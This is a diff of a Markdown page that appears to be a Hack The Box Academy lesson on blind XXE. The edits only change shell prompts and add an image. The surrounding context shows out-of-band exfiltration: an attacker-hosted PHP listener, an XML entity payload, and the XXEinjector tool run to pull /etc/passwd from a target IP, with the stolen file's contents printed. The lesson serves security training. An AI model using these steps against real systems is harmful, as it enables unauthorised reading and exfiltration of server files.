@@ -37,8 +37,8 @@ if(isset($_GET['content'])){
 ```
 
 ``` shell-session
-[!bash!]$ vi index.php # here we write the above PHP code
-[!bash!]$ php -S 0.0.0.0:8000
+ndefstathiou@htb[/htb]$ vi index.php # here we write the above PHP code
+ndefstathiou@htb[/htb]$ php -S 0.0.0.0:8000
 
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 ```
@@ -52,6 +52,8 @@ PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
 ]>
 <root>&content;</root>
 ```
+
+![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)
 
 ``` shell-session
 PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
@@ -69,7 +71,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ## Automated OOB Exfiltration
 
 ``` shell-session
-[!bash!]$ git clone https://github.com/enjoiz/XXEinjector.git
+ndefstathiou@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
 
 Cloning into 'XXEinjector'...
 ...SNIP...
@@ -93,7 +95,7 @@ XXEINJECT
 ```
 
 ``` shell-session
-[!bash!]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+ndefstathiou@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
 
 ...SNIP...
 [+] Sending request with malicious XML.
@@ -102,7 +104,7 @@ XXEINJECT
 ```
 
 ``` shell-session
-[!bash!]$ cat Logs/10.129.201.94/etc/passwd.log 
+ndefstathiou@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
